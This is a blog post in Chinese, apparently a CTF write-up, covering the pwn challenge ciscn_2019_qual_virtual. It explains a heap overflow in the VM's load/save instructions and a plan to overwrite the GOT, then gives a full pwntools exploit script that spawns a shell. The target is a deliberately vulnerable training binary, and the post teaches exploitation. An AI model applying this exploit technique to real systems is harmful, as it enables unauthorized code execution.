                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-20 02:32:37 / Modified: 02:34:42" itemprop="dateCreated datePublished" datetime="2023-06-20T02:32:37+08:00">2023-06-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>qual_virtual</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ciscn_2019_qual_virtual: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">3</span>d563a19678c3cec2fafbd07e6817b248c869819, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( do_mov_out(data, &amp;temp) )</span><br><span class="line">  <span class="keyword">return</span> do_mov_in(data, data-&gt;chunk[data-&gt;index + temp]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !do_mov_out(data, &amp;temp1) || !do_mov_out(data, &amp;temp2) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">data-&gt;chunk[data-&gt;index + temp1] = temp2;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1LL</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Load 和 Save 指令中存在堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>由于本题目不能随意控制 malloc 和 free，因此优先考虑打 GOT 表</p>
<p>仔细观察堆布局就可以发现破绽：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x1b822c0</span> <span class="comment">/* stack */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1b822c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x1b822c8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x1b822d0</span> —▸ <span class="number">0x1b822f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x1b822d8</span> ◂— <span class="number">0xffffffff00000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x1b822e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x1b822e8</span> ◂— <span class="number">0x211</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x1b822f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x1b822f8</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x1b824f0</span> <span class="comment">/* code */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1b824f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x1b824f8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x1b82500</span> —▸ <span class="number">0x1b82520</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x1b82508</span> ◂— <span class="number">0xffffffff00000080</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x1b82510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x1b82518</span> ◂— <span class="number">0x411</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x1b82520</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x1b82528</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x1b82920</span> <span class="comment">/* data */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1b82920</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x1b82928</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x1b82930</span> —▸ <span class="number">0x1b82950</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x1b82938</span> ◂— <span class="number">0xffffffff00000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x1b82940</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x1b82948</span> ◂— <span class="number">0x211</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x1b82950</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x1b82958</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>每个 get_Chunk 函数都会生成两个堆块，第一个堆块用于存放控制信息，而第二个堆块中可以任意堆溢出</li>
<li>只需要覆盖第一个堆块上的堆地址为 GOT 表地址，就可以控制 GOT 表</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./ciscn_2019_qual_virtual1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x4019E2&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">name = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">opcode = <span class="string">&quot;push push push save push sub pop&quot;</span></span><br><span class="line">stack = <span class="string">&quot;205200 4210720 -208 0&quot;</span> </span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Your program name:&quot;</span>,name)</span><br><span class="line">sla(<span class="string">&quot;Your instruction:&quot;</span>,opcode)</span><br><span class="line">sla(<span class="string">&quot;Your stack data:&quot;</span>,stack)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">332</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:53</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
